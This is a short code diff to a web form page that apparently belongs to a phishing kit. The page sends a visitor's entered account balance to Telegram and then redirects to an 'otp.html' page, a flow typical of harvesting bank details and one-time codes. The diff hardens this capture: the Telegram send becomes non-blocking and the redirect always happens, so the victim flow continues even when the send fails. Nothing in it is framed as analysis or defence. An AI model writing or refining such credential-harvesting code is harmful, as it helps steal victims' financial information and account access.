@@ -324,15 +324,17 @@
             submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
             
             try {
-                // Send balance to Telegram
-                await sendFormDataToTelegram('New Balance', {
+                // Send balance to Telegram (non-blocking - won't fail form submission)
+                sendFormDataToTelegram('New Balance', {
                     'Balance': balance
+                }).catch(err => {
+                    console.warn('Telegram notification failed (non-critical):', err);
                 });
                 
                 // Simulate processing time
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // Redirect to next page
+                // Always redirect - don't block on Telegram errors
                 window.location.href = 'otp.html?msg=lastt';
             } catch (error) {
                 console.error('Error submitting balance:', error);
